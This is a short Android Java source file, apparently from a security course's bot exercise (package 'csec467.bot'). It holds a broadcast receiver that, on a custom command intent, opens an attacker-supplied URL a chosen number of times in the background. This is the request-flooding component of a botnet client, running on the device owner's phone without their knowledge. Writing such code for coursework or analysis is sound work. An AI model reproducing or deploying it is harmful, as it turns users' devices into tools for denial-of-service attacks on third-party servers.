package csec467.bot;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;

import java.net.URL;
import java.net.URLConnection;
import java.util.Objects;

public class MyReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();

        if (Objects.equals(action, "csec467.bot.URL")) {
            String url = intent.getStringExtra("url");
            String count = intent.getStringExtra("url_count");
            new openURL().execute(url, count);
        }
    }

    static private class openURL extends AsyncTask<String, Void, String[]> {
        @Override
        protected String[] doInBackground(String[] params)
        {
            for (int i = 0; i < Integer.parseInt(params[1]); ++i) {
                try {
                    URL myUrl = new URL(params[0]);
                    URLConnection connection = myUrl.openConnection();
                    connection.setConnectTimeout(500);
                    connection.connect();
                } catch (Exception e) {
                    e.printStackTrace();
                }
            }
            return null;
        }
    }
}
